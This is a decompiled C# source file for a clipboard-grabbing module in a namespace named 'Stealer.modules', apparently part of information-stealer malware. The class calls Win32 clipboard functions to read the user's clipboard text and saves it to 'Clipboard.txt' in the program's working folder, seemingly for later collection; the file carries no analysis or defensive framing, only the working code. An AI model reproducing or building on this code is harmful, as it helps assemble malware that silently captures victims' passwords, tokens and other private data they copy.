using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Stealer.modules
{
	// Token: 0x02000029 RID: 41
	internal class Clipboard
	{
		// Token: 0x060000C8 RID: 200
		[DllImport("user32.dll")]
		private static extern bool IsClipboardFormatAvailable(uint format);

		// Token: 0x060000C9 RID: 201
		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool OpenClipboard(IntPtr hWndNewOwner);

		// Token: 0x060000CA RID: 202
		[DllImport("user32.dll")]
		private static extern IntPtr GetClipboardData(uint uFormat);

		// Token: 0x060000CB RID: 203
		[DllImport("kernel32.dll")]
		private static extern IntPtr GlobalLock(IntPtr hMem);

		// Token: 0x060000CC RID: 204
		[DllImport("kernel32.dll")]
		private static extern bool GlobalUnlock(IntPtr hMem);

		// Token: 0x060000CD RID: 205
		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool CloseClipboard();

		// Token: 0x060000CE RID: 206 RVA: 0x0000A07C File Offset: 0x0000827C
		public static string GetText()
		{
			string str = Program.path + "\\";
			if (Clipboard.IsClipboardFormatAvailable(13U) && Clipboard.OpenClipboard(IntPtr.Zero))
			{
				string contents = string.Empty;
				IntPtr clipboardData = Clipboard.GetClipboardData(13U);
				if (!clipboardData.Equals(IntPtr.Zero))
				{
					IntPtr intPtr = Clipboard.GlobalLock(clipboardData);
					if (!intPtr.Equals(IntPtr.Zero))
					{
						try
						{
							contents = Marshal.PtrToStringUni(intPtr);
							Clipboard.GlobalUnlock(intPtr);
						}
						catch
						{
						}
					}
				}
				Clipboard.CloseClipboard();
				File.WriteAllText(str + "Clipboard.txt", contents);
			}
			return null;
		}
	}
}
